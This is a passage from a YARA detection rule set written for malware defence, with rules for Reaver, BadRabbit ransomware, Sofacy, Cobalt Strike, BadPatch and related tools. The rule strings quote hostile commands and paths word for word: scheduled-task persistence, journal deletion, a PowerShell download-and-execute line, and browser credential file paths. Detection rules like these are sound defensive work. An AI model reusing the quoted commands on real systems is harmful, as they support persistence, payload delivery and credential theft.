\"cb36dcb9909e29a38c387b8a87e7e4ed\" or ( 2 of them ) )\n}\n\nrule Reaver3_Malware_Nov17_1_RID2F5B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 11:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1813f10bcf74beb582c824c64fff63cb150d178bef93af81d875ca84214307a1\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"CPL.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == \"e722dd50a0e2bc0cab8ca35fc4bf6d99\" and all of them )\n}\n\nrule Reaver3_Malware_Nov17_2_RID2F5C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 11:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"9213f70bce491991c4cbbbd7dc3e67d3a3d535b965d7064973b35c50f265e59b\"\n      hash2 = \"98eb5465c6330b9b49df2e7c9ad0b1164aa5b35423d9e80495a178eb510cdc1c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"WindowsUpdateReaver\" fullword wide\n      $s1 = \"\\\\WUpdate.~tmp\" ascii\n      $s2 = \"\\\\~WUpdate.lnk\" ascii\n      $s3 = \"\\\\services\\\\\" ascii\n      $s4 = \"moomjufps\" fullword ascii\n      $s5 = \"gekmomkege\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"837cc5062a0758335b257ea3b27972b2\" or 1 of ( $x* ) or 3 of them )\n}\n\nrule Reaver3_Malware_Nov17_3_RID2F5D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 11:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"18ac3b14300ecfeed4b64a844c16dccb06b0e3513d0954d6c6182f2ea14e4c92\"\n      hash2 = \"c0f8bb77284b96e07cab1c3fab8800b1bbd030720c74628c4ee5666694ef903d\"\n      hash3 = \"c906250e0a4c457663e37119ebe1efa1e4b97eef1d975f383ac3243f9f09908c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"winhelp.dat\" fullword ascii\n      $s2 = \"\\\\microsoft\\\\Credentials\\\\\" ascii\n      $s3 = \"~Update.lnk\" fullword ascii\n      $s4 = \"winhelp.cpl\" fullword ascii\n      $s5 = \"\\\\services\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"8ee521b2316ddd6af1679eac9f5ed77b\" or 4 of them )\n}\n\nrule SunOrcal_Malware_Nov17_1_RID2FEA : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 12:17:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cb7c0cf1750baaa11783e93369230ee666b9f3da7298e4d1bb9a07af6a439f2f\"\n      hash2 = \"799139b5278dc2ac24279cc6c3db44f4ef0ea78ee7b721b0ace38fd8018c51ac\"\n      hash3 = \"38ea33dab0ba2edd16ecd98cba161c550d1036b253c8666c4110d198948329fb\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"kQZ6l5t1kAlsjmBzsCZPrSpQn5tFrChLtTdsgTlOsClKt5pBsDdFrSVshnxMr6ZOpn9slndBsy1jq6lIr216rSNApn9P\" fullword ascii\n      $x2 = { 00 00 00 00 00 00 00 00 00 00 00 00 21 21 21 73\n              79 73 74 65 6D 00 00 00 00 00 00 00 00 00 00 00 } \n      $x3 = \"!!!url!!!\" fullword ascii\n      $x4 = \"h4NcbkdLrCpFpPQ=\" fullword ascii\n      $x5 = \"GloablCryptNv1\" fullword ascii\n      $x6 = \"Gloabl\\\\CryptNv1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them\n}\n\nrule Daserf_Nov1_BronzeButler_RID3066 : CHINA DEMO EXE FILE G0060 MAL {\n   meta:\n      description = \"Detects Daserf malware used by Bronze Butler\"\n      author = \"Florian Roth\"\n      reference = \"http://127.0.0.1\"\n      date = \"2017-11-08 12:38:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5ede6f93f26ccd6de2f93c9bd0f834279df5f5cfe3457915fae24a3aec46961b\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0060, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mstmp1845234.exe\" fullword ascii\n      $x2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)\" fullword ascii\n      $x3 = \"Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\" fullword ascii\n      $s1 = \"Content-Type: */*\" fullword ascii\n      $s2 = \"ProxyEnable\" ascii fullword\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\" ascii fullword\n      $s4 = \"iexplore.exe\" ascii fullword\n      $s5 = \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\Cu\" ascii\n      $s6 = \"rrentVersion\\\\Internet Settings\" fullword ascii\n      $s7 = \"ws\\\\CurrentVersion\\\\Inter\" fullword ascii\n      $s8 = \"Documents an\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 5 of them )\n}\n\nrule CrunchRAT_RID2A5B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CrunchRAT_RID2A5B - file CrunchRAT_RID2A5B.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/t3ntman/CrunchRAT_RID2A5B\"\n      date = \"2017-11-03 05:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"58a07e96497745b6fd5075d569f17b0254c3e50b0234744e0487f7c5dddf7161\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"----CrunchRAT_RID2A5B\" fullword wide\n      $x2 = \"\\\\Debug\\\\CrunchRAT_RID2A5B\" ascii\n      $x3 = \"\\\\Release\\\\CrunchRAT_RID2A5B\" ascii\n      $s1 = \"runCommand\" fullword ascii\n      $s2 = \"<action>download<action>\" fullword wide\n      $s3 = \"Content-Disposition: form-data; name=action\" fullword wide\n      $s4 = \"<action>upload<action>\" fullword wide\n      $s5 = \"/update.php\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and 3 of them )\n}\n\nrule PowerShell_Mal_HackTool_Gen_RID317C : DEMO GEN HKTL MAL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects PowerShell hack tool samples - generic PE loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-11-02 13:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d442304ca839d75b34e30e49a8b9437b5ab60b74d85ba9005642632ce7038b32\"\n      tags = \"DEMO, GEN, HKTL, MAL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$PEBytes32 = 'TVqQAAMAAAAEAAAA\" wide\n      $x2 = \"Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp\" fullword wide\n      $x3 = \"@($PEBytes64, $PEBytes32, \\\"Void\\\", 0, \\\"\\\", $ExeArgs)\" fullword wide\n      $x4 = \"(Shellcode: LoadLibraryA.asm)\" fullword wide\n   condition: \n      filesize < 8000KB and 1 of them\n}\n\nrule Silence_malware_1_RID2DAC : DEMO EXE FILE G0091 MAL {\n   meta:\n      description = \"Detects malware sample mentioned in the Silence report on Securelist\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/the-silence/83009/\"\n      date = \"2017-11-01 10:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f24b160e9e9d02b8e31524b8a0b30e7cdc66dd085e24e4c58240e4c4b6ec0ac2\"\n      tags = \"DEMO, EXE, FILE, G0091, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"adobeudp.exe\" fullword wide\n      $x2 = \"%s\\\\adobeudp.exeZone.Identifier\" fullword ascii\n      $x3 = \"%s\\\\igfxpers_%08x.exe\" fullword ascii\n      $x4 = \"%s\\\\adobeudp.exe\" fullword ascii\n      $s1 = \"SoftWare\\\\MicroSoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword ascii\n      $s2 = \"Copyright (C)  1999 - 2017\" fullword wide\n      $s3 = \"%sget.php?name=%x\" fullword ascii\n      $s4 = \"VNASSRUNXYC\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"e03edb9bd7cbe200dc59f361db847f8a\" or 1 of ( $x* ) or 3 of them )\n}\n\nrule BadRabbit_Gen_RID2BE5 : CRIME DEMO EXE FILE GEN MAL RANSOM T1047 T1053_005 T1218_011 T1543_003 {\n   meta:\n      description = \"Detects BadRabbit Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://pastebin.com/Y7pJv3tK\"\n      date = \"2017-10-25 09:26:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8ebc97e05c8e1073bda2efb6f4d00ad7e789260afa2c276f0c72740b838a0a93\"\n      hash2 = \"579fd8a0385482fb4c789561a30b09f25671e86422f40ef5cca2036b28f99648\"\n      hash3 = \"630325cac09ac3fab908f903e3b00d0dadd5fdaa0875ed8496fcbb97a558d0da\"\n      tags = \"CRIME, DEMO, EXE, FILE, GEN, MAL, RANSOM, T1047, T1053_005, T1218_011, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"schtasks /Create /SC ONCE /TN viserion_%u /RU SYSTEM /TR \\\"%ws\\\" /ST\" fullword wide\n      $x2 = \"schtasks /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR \\\"%ws /C Start \\\\\\\"\\\\\\\" \\\\\\\"%wsdispci.exe\\\\\\\"\" fullword wide\n      $x3 = \"C:\\\\Windows\\\\infpub.dat\" fullword wide\n      $x4 = \"C:\\\\Windows\\\\cscc.dat\" fullword wide\n      $s1 = \"need to do is submit the payment and get the decryption password.\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\GLOBALROOT\\\\ArcName\\\\multi(0)disk(0)rdisk(0)partition(1)\" fullword wide\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\%ws\" fullword wide\n      $s4 = \"fsutil usn deletejournal /D %c:\" fullword wide\n      $s5 = \"Run DECRYPT app at your desktop after system boot\" fullword ascii\n      $s6 = \"Files decryption completed\" fullword wide\n      $s7 = \"Disable your anti-virus and anti-malware programs\" fullword wide\n      $s8 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\%ws\" fullword wide\n      $s9 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n      $s10 = \"%ws C:\\\\Windows\\\\%ws,#1 %ws\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule BadRabbit_Mimikatz_Comp_RID2FFF : DEMO EXE FILE MAL S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://pastebin.com/Y7pJv3tK\"\n      date = \"2017-10-25 12:21:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f8c54f9fa8e47596a3beff0031f85360e56840c77f71c6a573ace6f46412035\"\n      tags = \"DEMO, EXE, FILE, MAL, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%lS%lS%lS:%lS\" fullword wide\n      $s2 = \"lsasrv\" fullword wide\n      $s3 = \"CredentialKeys\" ascii\n      $s4 = { 50 72 69 6D 61 72 79 00 6D 00 73 00 76 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them )\n}\n\nrule KasperMalware_Oct17_1_RID2EBD : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Kasper Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-10-24 11:27:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"758bdaf26a0bd309a5458cb4569fe1c789cf5db087880d6d1676dec051c3a28d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\kasper.pdb\" ascii\n      $x2 = \"C:\\\\D@oc@um@en@ts a@nd Set@tings\\\\Al@l Users\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and ( pe.imphash ( ) == \"2bceb64cf37acd34bc33b38f2cddfb61\" or 1 of them )\n}\n\nrule Sofacy_Oct17_1_RID2BF3 : APT DEMO EXE FILE G0007 RUSSIA T1218_011 {\n   meta:\n      description = \"Detects Sofacy malware reported in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html\"\n      date = \"2017-10-23 09:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"522fd9b35323af55113455d823571f71332e53dde988c2eb41395cf6b0c15805\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA, T1218_011\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"%localappdata%\\\\netwf.dll\" fullword wide\n      $x2 = \"set path = \\\"%localappdata%\\\\netwf.dll\\\"\" fullword ascii\n      $x3 = \"%localappdata%\\\\netwf.bat\" fullword wide\n      $x4 = \"KlpSvc.dll\" fullword ascii\n      $g1 = \"set path = \\\"%localappdata%\\\\\" ascii\n      $g2 = \"%localappdata%\\\\\" wide\n      $s1 = \"start rundll32.exe %path %,#1a\" fullword ascii\n      $s2 = \"gshell32\" fullword wide\n      $s3 = \"s - %lu\" fullword ascii\n      $s4 = \"be run i\" fullword ascii\n      $s5 = \"ingToBinhary\" fullword ascii\n      $s6 = \"%j%Xjs\" fullword ascii\n      $s7 = \"if NOT exist %path % (exit)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"a2d1be6502b4b3c28959a4fb0196ea45\" or pe.exports ( \"KlpSvc\" ) or ( 1 of ( $x* ) or 4 of them ) or ( $s1 and all of ( $g* ) ) )\n}\n\nrule Sofacy_Oct17_2_RID2BF4 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detects Sofacy malware reported in October 2017\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html\"\n      date = \"2017-10-23 09:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ef027405492bc0719437eb58c3d2774cc87845f30c40040bbebbcc09a4e3dd18\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"netwf.dll\" fullword wide\n      $s1 = \"%s - %s - %2.2x\" fullword wide\n      $s2 = \"%s - %lu\" fullword ascii\n      $s3 = \"%s \\\"%s\\\", %s\" fullword wide\n      $s4 = \"%j%Xjsf\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( pe.imphash ( ) == \"13344e2a717849489bcd93692f9646f7\" or ( 4 of them ) ) ) or ( all of them )\n}\n\nrule TA17_293A_Hacktool_PS_1_RID2E72 : APT DEMO SCRIPT T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 11:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"72a28efb6e32e653b656ca32ccd44b3111145a695f6f6161965deebbdc437076\"\n      tags = \"APT, DEMO, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=f\" ascii\n      $x2 = \"} | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments\" fullword ascii\n   condition: \n      ( filesize < 80KB and 1 of them )\n}\n\nrule TA17_293A_Hacktool_Touch_MAC_modification_RID35C7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 16:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"070d7082a5abe1112615877214ec82241fd17e5bd465e24d794a470f699af88e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-t time - use the time specified to update the access and modification times\" fullword ascii\n      $s2 = \"Failed to set file times for %s. Error: %x\" fullword ascii\n      $s3 = \"touch [-acm][ -r ref_file | -t time] file...\" fullword ascii\n      $s4 = \"-m - change the modification time only\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule TA17_293A_Hacktool_Exploit_MS16_032_RID327E : APT DEMO EXPLOIT {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 14:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9b97290300abb68fb48480718e6318ee2cdd4f099aa6438010fb2f44803e0b58\"\n      tags = \"APT, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread)))\" ascii\n      $x2 = \"0x00000002, \\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\", \\\"\\\",\" fullword ascii\n      $x3 = \"PowerShell implementation of MS16-032. The exploit targets all vulnerable\" fullword ascii\n      $x4 = \"If we can't open the process token it's a SYSTEM shell!\" fullword ascii\n   condition: \n      ( filesize < 40KB and 1 of them )\n}\n\nrule Imphash_UPX_Packed_Malware_1_TA17_293A_RID3430 : APT DEMO EXE FILE T1027_002 {\n   meta:\n      description = \"Detects malware based on Imphash of malware used in TA17-293A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 15:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a278256fbf2f061cfded7fdd58feded6765fade730374c508adad89282f67d77\"\n      tags = \"APT, DEMO, EXE, FILE, T1027_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and pe.imphash ( ) == \"d7d745ea39c8c5b82d5e153d3313096c\" )\n}\n\nrule Imphash_Malware_2_TA17_293A_RID302E : APT DEMO EXE FILE HIGHVOL {\n   meta:\n      description = \"Detects malware based on Imphash of malware used in TA17-293A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n      date = \"2017-10-21 12:28:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, HIGHVOL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and pe.imphash ( ) == \"a8f69eb2cf9f30ea96961c86b4347282\" )\n}\n\nrule WinAgent_BadPatch_1_RID2E14 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples mentioned in BadPatch report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/10/unit42-badpatch/\"\n      date = \"2017-10-20 10:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"285998bce9692e46652529685775aa05e3a5cb93ee4e65d021d2231256e92813\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"J:\\\\newPatch\\\\downloader\\\\\" wide\n      $x2 = \"L:\\\\rashed\\\\New code\\\\\" wide\n      $x3 = \":\\\\newPatch\\\\last version\\\\\" wide\n      $x4 = \"\\\\Microsoft\\\\Microsoft\\\\Microsoft1.log\" wide\n      $x5 = \"\\\\Microsoft\\\\Microsoft\\\\Microsoft.log\" wide\n      $x6 = \"\\\\Microsoft\\\\newPP.exe\" wide\n      $x7 = \" (this is probably a proxy server error).\" fullword wide\n      $x8 = \" :Old - update patch and check anti-virus.. \" fullword wide\n      $x9 = \"PatchNotExit-- download now.. \" fullword wide\n      $x10 = \"PatchNotExit-- Check Version\" fullword wide\n      $x11 = \"PatchNotExit-- Version Patch\" fullword wide\n      $s1 = \"downloader \" fullword wide\n      $s2 = \"DelDownloadFile\" fullword ascii\n      $s3 = \"downloadFile\" fullword ascii\n      $s4 = \"downloadUpdate\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 4 of them ) )\n}\n\nrule WinAgent_BadPatch_2_RID2E15 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples mentioned in BadPatch report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2017/10/unit42-badpatch/\"\n      date = \"2017-10-20 10:59:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"106deff16a93c4a4624fe96e3274e1432921c56d5a430834775e5b98861c00ea\"\n      hash2 = \"ece76fdf7e33d05a757ef5ed020140d9367c7319022a889923bbfacccb58f4d7\"\n      hash3 = \"cf53fc8c9ce4e5797cc5ac6f71d4cbc0f2b15f2ed43f38048a5273f40bc09876\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"myAction=shell_result&serialNumber=\" fullword wide\n      $s2 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data.*\" wide\n      $s3 = \"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\" wide\n      $s4 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies.*\" wide\n      $s5 = \"newSHELL[\" fullword wide\n      $s6 = \"\\\\file1.txt\" wide\n      $s7 = \"myAction=newGIF&serialNumber=\" fullword wide\n      $s8 = \"\\\\Storege1\" wide\n      $s9 = \"\\\\Microsoft\\\\mac.txt\" wide\n      $s10 = \"spytube____:\" fullword ascii\n      $s11 = \"0D0700045F5C5B0312045A04041F40014B1D11004A1F19074A141100011200154B031C04\" fullword wide\n      $s12 = \"16161A1000012B162503151851065A1A0007\" fullword wide\n      $s13 = \"-- SysFile....\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 3 of them )\n}\n\nrule SeDLL_Javascript_Decryptor_RID3136 : APT DEMO EXE FILE T1218_010 {\n   meta:\n      description = \"Detects SeDll - DLL is used for decrypting and executing another JavaScript backdoor such as Orz\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets\"\n      date = \"2017-10-18 13:12:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"146aa9a0ec013aa5bdba9ea9d29f59d48d43bc17c6a20b74bb8c521dbb5bc6f4\"\n      tags = \"APT, DEMO, EXE, FILE, T1218_010\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SEDll_Win32.dll\" fullword ascii\n      $x2 = \"regsvr32 /s \\\"%s\\\" DR __CIM__\" wide\n      $s1 = \"WScriptW\" fullword ascii\n      $s2 = \"IWScript\" fullword ascii\n      $s3 = \"%s\\\\%s~%d\" fullword wide\n      $s4 = \"PutBlockToFileWW\" fullword ascii\n      $s5 = \"CheckUpAndDownWW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule Leviathan_CobaltStrike_Sample_1_RID3324 : APT COBALTSTRIKE DEMO EXE FILE G0065 S0154 T1105 T1550_002 {\n   meta:\n      description = \"Detects Cobalt Strike sample from Leviathan report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets\"\n      date = \"2017-10-18 14:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5860ddc428ffa900258207e9c385f843a3472f2fbf252d2f6357d458646cf362\"\n      tags = \"APT, COBALTSTRIKE, DEMO, EXE, FILE, G0065, S0154, T1105, T1550_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"a54c81.dll\" fullword ascii\n      $x2 = \"%d is an x64 process (can't inject x86 content)\" fullword ascii\n      $x3 = \"Failed to impersonate logged on user %d (%u)\" fullword ascii\n      $s1 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n      $s2 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n      $s3 = \"could not run command (w/ token) because of its length of %d bytes!\" fullword ascii\n      $s4 = \"could not write to process memory: %d\" fullword ascii\n      $s5 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n      $s6 = \"Could not connect to pipe (%s): %d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule MockDll_Gen_RID2B30 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects MockDll - regsvr DLL loader\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets\"\n      date = \"2017-10-18 08:55:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = 